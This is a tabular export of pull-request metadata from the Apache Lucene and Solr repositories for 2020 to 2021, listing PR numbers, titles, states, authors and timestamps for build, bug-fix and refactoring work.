"","2407","LUCENE-9792: add testRegressions task that downloads and runs hunspell regression tests.","","closed","","dweiss","2021-02-19T19:57:32Z","2021-02-19T20:13:40Z"
"","2362","LUCENE-9767: infrastructure for icu regeneration in place.","","closed","","dweiss","2021-02-12T16:05:41Z","2021-02-14T20:07:39Z"
"","2361","LUCENE-9768: Add source sets for src/tools, clean up forbidden API and formatting errors","","closed","","dweiss","2021-02-12T15:26:20Z","2021-02-12T21:21:45Z"
"","2359","SOLR-15138: PerReplicaStates does not scale to large collections as well as state.json (8x )","","closed","","noblepaul","2021-02-12T07:16:57Z","2021-07-22T04:38:34Z"
"","2337","LUCENE-9747: dodge javadoc reporter NPE bug on Java 11.","","closed","","dweiss","2021-02-09T20:39:52Z","2021-02-09T20:47:39Z"
"","2327","LUCENE-9740: scan affix stream once.","","closed","","dweiss","2021-02-08T21:45:24Z","2021-02-09T10:31:56Z"
"","2324","LUCENE-9744: NPE on a degenerate query in MinimumShouldMatchIntervals… (8x backport)","","closed","","dweiss","2021-02-08T20:52:46Z","2021-02-08T21:43:09Z"
"","2323","LUCENE-9744: NPE on a degenerate query in MinimumShouldMatchIntervalsSource$MinimumMatchesIterator.getSubMatches()","","closed","","dweiss","2021-02-08T20:23:22Z","2021-02-08T20:49:01Z"
"","2313","LUCENE-9727: build side support for running Hunspell tests.","","closed","","dweiss","2021-02-07T11:03:30Z","2021-02-08T09:50:26Z"
"","2303","LUCENE-9715: fix int overflow in Lucene90VectorReader","","closed","","msokolov","2021-02-04T16:00:14Z","2021-02-04T18:59:34Z"
"","2297","SOLR-14253 Avoid writes in ZKSR.waitForState","","closed","","madrob","2021-02-03T17:56:38Z","2021-02-03T20:40:11Z"
"","2291","SOLR-15122 Replace volatile+sleep with wait/notify","","closed","","madrob","2021-02-02T17:51:13Z","2021-02-04T01:39:08Z"
"","2239","LUCENE-9695: don't merge deleted vectors","","closed","","msokolov","2021-01-23T20:01:20Z","2021-01-27T17:19:01Z"
"","2225","LUCENE-9683: fix incorrect logic for measuring stall time information.","","closed","","dweiss","2021-01-20T13:06:00Z","2021-01-20T18:05:23Z"
"","2208","LUCENE-9658: Make 'precommit' an alias for gradle 'check' task.","","open","","dweiss","2021-01-15T14:04:03Z","2021-01-15T14:04:03Z"
"","2190","Make :localSettings always available, even if it's a noop on subsequent runs","","closed","","dweiss","2021-01-08T19:26:04Z","2021-01-08T19:26:36Z"
"","2189","SOLR-14413 fix unit test to use delayed handler","","closed","","madrob","2021-01-08T18:29:11Z","2021-01-11T18:15:34Z"
"","2187","SOLR-15052  Reducing overseer bottlenecks using per-replica states (8x)","","closed","","noblepaul","2021-01-08T01:15:33Z","2021-01-10T16:46:47Z"
"","2172","SOLR-15062: /api/cluster/zk/ls should give the stat of the current node","","closed","","noblepaul","2020-12-29T06:01:09Z","2021-01-04T03:08:45Z"
"","2171","LUCENE-9650: disable errorprone on jdk16+","","closed","","dweiss","2020-12-28T20:50:15Z","2020-12-28T22:20:53Z"
"","2168","SOLR-15061: Fix NPE in SearchHandler when shards.info","","closed","","bruno-roustant","2020-12-24T10:49:49Z","2021-01-05T14:33:06Z"
"","2167","LUCENE-9643: git revisions for .git-blame-ignore-revs need to be full","","closed","","dweiss","2020-12-23T22:31:44Z","2020-12-23T22:31:51Z"
"","2153","LUCENE-9570: A non-mergable PR with reformatted code.","","closed","","dweiss","2020-12-17T12:16:20Z","2021-01-05T12:52:06Z"
"","2127","LUCENE-9633: Improve match highlighter behavior for degenerate intervals","","closed","","dweiss","2020-12-07T16:55:51Z","2020-12-11T19:07:26Z"
"","2099","SOLR-14977: improved plugin configuration","","closed","","noblepaul","2020-11-27T05:30:50Z","2020-12-16T06:04:34Z"
"","2073","LUCENE-9602: Add backward-compatibility tests for indices created with BEST_COMPRESSION.","","open","","jpountz","2020-11-10T14:33:20Z","2020-11-10T14:34:50Z"
"","2066","SOLR-14975: Optimize CoreContainer.getAllCoreNames and getLoadedCoreNames.","","closed","","bruno-roustant","2020-11-06T17:40:57Z","2020-11-12T08:28:20Z"
"","2065","SOLR-14977 :  ContainerPlugins should be configurable","","closed","","noblepaul","2020-11-06T04:17:29Z","2020-11-16T13:19:51Z"
"","2061","LUCENE-9597: checkWorkingCopyClean shouldn't complain about untracked empty folders","","closed","","dweiss","2020-11-03T11:29:29Z","2020-11-03T11:50:06Z"
"","2060","SOLR-14912: Unify solr-contrib-extraction with the artifact it produces","","closed","","dweiss","2020-11-03T11:06:01Z","2020-11-03T13:15:27Z"
"","2058","SOLR-14981: Remove search results clustering contrib from 8x","","closed","","dweiss","2020-11-03T09:31:02Z","2020-11-03T10:26:51Z"
"","2054","Typo in IndexWriter","","closed","","ebourg","2020-11-02T11:38:43Z","2020-11-02T11:40:54Z"
"","2019","SOLR-14354: Revert changes for 8.x","","closed","","CaoManhDat","2020-10-22T13:34:23Z","2020-11-10T18:25:21Z"
"","2001","Correct EOL at the end of sha for junit, branch_8x","","closed","","dweiss","2020-10-18T07:45:02Z","2020-10-20T07:07:45Z"
"","1995","LUCENE-9575 Add PatternTypingFilter to annotate tokens with flags and types","","closed","","gus-asf","2020-10-16T15:10:23Z","2021-01-23T23:40:14Z"
"","1993",".gitignore clean up","","closed","","dsmiley","2020-10-16T13:03:50Z","2020-10-24T15:10:02Z"
"","1984","SOLR-14930: Deprecate rulebased replica placement strategy(in 8.x)","","closed","deprecation,","noblepaul","2020-10-15T01:46:53Z","2020-10-20T01:50:16Z"
"","1982","LUCENE-9579 Update to JUnit 4.13.1","","closed","","madrob","2020-10-14T17:57:55Z","2020-10-14T18:56:40Z"
"","1980","SOLR-14930: Deprecate rulebased replica placement strategy (remove in 9.0)","","closed","deprecation,","noblepaul","2020-10-14T07:03:26Z","2020-10-20T01:50:13Z"
"","1979","LUCENE-9574 Add DropIfFlaggedFilterFactory","","closed","","gus-asf","2020-10-14T03:08:06Z","2020-10-14T17:26:36Z"
"","1973","SOLR-14922: Include solr-ref-guide tasks in sourceSets for IntelliJ","","closed","","dweiss","2020-10-12T10:16:26Z","2020-10-12T10:25:18Z"
"","1969","LUCENE-6831: start removing LinkedList in favor of ArrayList or De/Queues","","closed","","dweiss","2020-10-09T12:55:46Z","2020-10-12T07:15:17Z"
"","1968","LUCENE-9562: Unify 'analysis' package with produced artifact names (-analyzers- to -analysis-)","","closed","","dweiss","2020-10-09T09:55:40Z","2020-10-12T07:15:57Z"
"","1966","LUCENE-9574 Add DropIfFlaggedFilterFactory","","closed","","gus-asf","2020-10-08T16:58:37Z","2020-10-13T20:23:55Z"
"","1965","LUCENE-9572 - TypeAsSynonymFilter gains selective flag transfer and an ignore list.","","closed","","gus-asf","2020-10-08T16:15:13Z","2020-10-16T01:51:56Z"
"","1963","SOLR-14827: Refactor schema loading to not use XPath","","closed","perf,","noblepaul","2020-10-08T11:18:03Z","2020-12-18T16:11:51Z"
"","1955","LUCENE-9566 TestApproximationSearchEquivalence.testExclusion fix","","closed","","mayya-sharipova","2020-10-06T21:49:48Z","2020-10-07T11:02:51Z"
"","1950","LUCENE-9564: add spotless and gjf.","","closed","","dweiss","2020-10-06T07:38:12Z","2020-12-17T12:11:55Z"
"","1945","SOLR-14680: revert from 8x","","closed","","noblepaul","2020-10-04T05:23:37Z","2020-10-20T01:50:54Z"
"","1933","LUCENE-9550: Upgrade to Gradle 6.6.1.","","closed","","jpountz","2020-09-30T08:35:03Z","2020-09-30T09:17:59Z"
"","1929","LUCENE-9548: Apache repository publishing","","closed","","dweiss","2020-09-29T08:23:41Z","2020-10-04T17:18:30Z"
"","1911","SOLR-14890: Refactor code to use annotations for configset API","","closed","","noblepaul","2020-09-23T07:59:50Z","2020-09-24T01:01:21Z"
"","1902","SOLR-14840: Overseer doc in asciidoc","","closed","","murblanc","2020-09-21T17:22:06Z","2020-09-22T07:03:43Z"
"","1887","SOLR-14875: Make SolrEventListeners load from packages","","closed","packages,","noblepaul","2020-09-17T13:55:40Z","2020-09-23T08:01:03Z"
"","1886","LUCENE-9531: Consolidate duplicated generated classes CharStream and FastCharStream","","closed","","dweiss","2020-09-17T11:54:13Z","2020-09-18T06:53:31Z"
"","1885","SOLR-14613: use set-placement-plugin for both setting and unsetting plugin config","","closed","","murblanc","2020-09-17T10:50:23Z","2020-09-17T13:01:25Z"
"","1883","LUCENE-9530: cleaned up javacc gradle generation scripts.","","closed","","dweiss","2020-09-17T08:17:49Z","2020-09-17T08:53:02Z"
"","1880","SOLR-14151: Do not reload core for schema changes","","closed","","noblepaul","2020-09-17T01:36:44Z","2020-09-22T12:04:06Z"
"","1878","SOLR-14871 Use Annotations for v2 APIs in/cluster path","","closed","","noblepaul","2020-09-16T06:37:12Z","2020-09-16T08:06:49Z"
"","1869","SOLR-14866 autowidth tables in ref guide","","closed","","epugh","2020-09-14T12:49:15Z","2021-08-05T17:55:44Z"
"","1868","LUCENE-9522: Instructions for reproducing failing tests still mention ant","","closed","","dweiss","2020-09-14T10:52:21Z","2020-09-14T11:29:32Z"
"","1853","LUCENE-9519: Correct behavior for highlights that cross multi-value boundary","","closed","","dweiss","2020-09-10T13:52:17Z","2020-09-10T14:15:52Z"
"","1852","propegate() to propagate()","","closed","","noblepaul","2020-09-10T11:41:26Z","2020-09-23T08:01:33Z"
"","1851","LUCENE-9518: Add sanity to gradle archiving tasks.","","closed","","dweiss","2020-09-10T07:25:50Z","2020-09-10T07:48:05Z"
"","1844","SOLR-14847: Create Solr Server TGZ","","closed","build,","madrob","2020-09-08T19:54:39Z","2020-09-10T15:55:54Z"
"","1830","LUCENE-9506: Gradle: split validateSourcePatterns into per-project an…","","closed","","dweiss","2020-09-04T09:33:51Z","2020-09-08T08:26:23Z"
"","1829","LUCENE-9505: add dummy outputs to tasks with no outputs","","closed","","dweiss","2020-09-04T08:56:57Z","2020-09-04T09:12:02Z"
"","1828","LUCENE-9497: add google error prone checks","","closed","","dweiss","2020-09-04T07:30:13Z","2020-09-07T21:45:18Z"
"","1826","LUCENE-9504 Remove extra lock in DocumentsWriterDeleteQueue","","closed","","madrob","2020-09-03T17:59:21Z","2020-09-08T15:13:23Z"
"","1821","SOLR-14822: Gradle: solr ref guide's dependencies should be moved to the test pool (palantir)","","closed","","dweiss","2020-09-02T11:05:38Z","2020-09-02T11:21:22Z"
"","1820","LUCENE-9464: Add high(er)-level hit highlighter example that demonstrates and uses low-level components","","closed","","dweiss","2020-09-02T10:17:08Z","2020-09-10T11:17:37Z"
"","1819","SOLR-14782: Document how to unescape for the QueryElevationComponent.","","closed","","bruno-roustant","2020-09-02T09:49:06Z","2020-09-02T15:44:29Z"
"","1816","LUCENE-9497: Integerate Error Prone ( Static Analysis Tool ) during compilation","","closed","","vthacker","2020-09-01T23:02:19Z","2020-09-07T21:42:49Z"
"","1815","SOLR-14151: Bug fixes","","closed","packages,","noblepaul","2020-09-01T07:43:53Z","2020-09-23T08:01:26Z"
"","1814","SOLR-14776: Precompute the fingerprint during PeerSync","","closed","","CaoManhDat","2020-09-01T04:10:15Z","2020-10-20T01:50:19Z"
"","1809","LUCENE-9493: Remove obsolete dev-tools/{idea,netbeans,maven} folders","","closed","","dweiss","2020-08-31T19:03:49Z","2020-09-01T07:57:18Z"
"","1807","LUCENE-9491: Consolidate test options and improve support for dynamic…","","closed","","dweiss","2020-08-31T09:28:06Z","2020-08-31T10:20:30Z"
"","1804","SOLR-14151: Bug fixes","","closed","","noblepaul","2020-08-30T14:06:28Z","2020-10-08T11:00:17Z"
"","1801","SOLR-14794: pass configuration to Collection API commands","","closed","","murblanc","2020-08-29T21:02:22Z","2020-08-30T09:36:58Z"
"","1793","LUCENE-9486: Use preset dictionaries with LZ4 for BEST_SPEED.","","closed","","jpountz","2020-08-27T14:43:59Z","2020-09-03T10:17:08Z"
"","1778","SOLR-14772: Fix TestConfigOverlay","","closed","","atris","2020-08-24T15:41:45Z","2020-08-24T17:04:24Z"
"","1768","LUCENE-9472: Test duplication within gradle's infrastructure.","","open","","dweiss","2020-08-20T13:11:24Z","2020-08-21T08:26:04Z"
"","1767","LUCENE-9471: clean up task and global temporary junk files (workaround).","","closed","","dweiss","2020-08-20T10:53:57Z","2020-08-20T11:49:24Z"
"","1766","SOLR-14765: optimize DocList creation for sort-irrelevant cases","","closed","","magibney","2020-08-20T03:09:43Z","2022-02-09T09:44:47Z"
"","1765","SOLR-14764: optimize index-order sort for FacetFieldProcessorByArray","","closed","","magibney","2020-08-20T02:39:26Z","2022-02-09T09:48:20Z"
"","1761","LUCENE-9438: Eclipse IDE support with gradle build system","","closed","","dweiss","2020-08-19T11:28:34Z","2020-08-21T19:47:12Z"
"","1757","LUCENE-9465: 'beast' task from within gradle","","closed","","dweiss","2020-08-17T11:07:49Z","2020-08-18T07:28:51Z"
"","1749","LUCENE-9462: Fields without positions should still return MatchIterator.","","closed","","dweiss","2020-08-14T09:14:38Z","2020-08-14T09:45:33Z"
"","1742","Standalone distribution assembly for Luke","","closed","","dweiss","2020-08-12T06:47:11Z","2020-08-12T14:28:49Z"
"","1729","SOLR-14725 update batchSize parameter docs for update() and delete() stream expressions","","closed","","epugh","2020-08-09T12:54:23Z","2020-10-20T01:51:10Z"
"","1724","SOLR-14684: CloudExitableDirectoryReaderTest failing about 25% of the time","","closed","","CaoManhDat","2020-08-07T11:31:18Z","2020-08-21T08:41:19Z"
"","1722","SOLR-14713: Single thread on streaming updates","","open","","CaoManhDat","2020-08-06T10:04:26Z","2020-08-06T10:04:26Z"
"","1721","LUCENE-9439: match region highlighter components","","open","","dweiss","2020-08-06T09:47:46Z","2020-08-14T10:39:58Z"
"","1692","SOLR-14581 Document the way auto commits work in SolrCloud","","closed","ref-guide,","epugh","2020-07-24T19:22:22Z","2020-08-13T14:52:04Z"
"","1691","SOLR-8362: proposal for polyField docValues support for TextField","","open","","magibney","2020-07-24T19:09:46Z","2020-10-14T20:41:50Z"
"","1677","SOLR-14654 Remove plugin loading from .system collection (for 9.0)","","closed","deprecation,","noblepaul","2020-07-16T14:41:36Z","2020-08-14T01:10:58Z"
"","1670","SOLR-14637 update CloudSolrClient examples to remove deprecated .Builder() method","","closed","","epugh","2020-07-13T16:39:18Z","2020-08-13T14:52:02Z"
"","1669","SOLR-14151 Make schema components load from packages","","closed","packages,","noblepaul","2020-07-13T15:32:21Z","2020-08-14T01:10:58Z"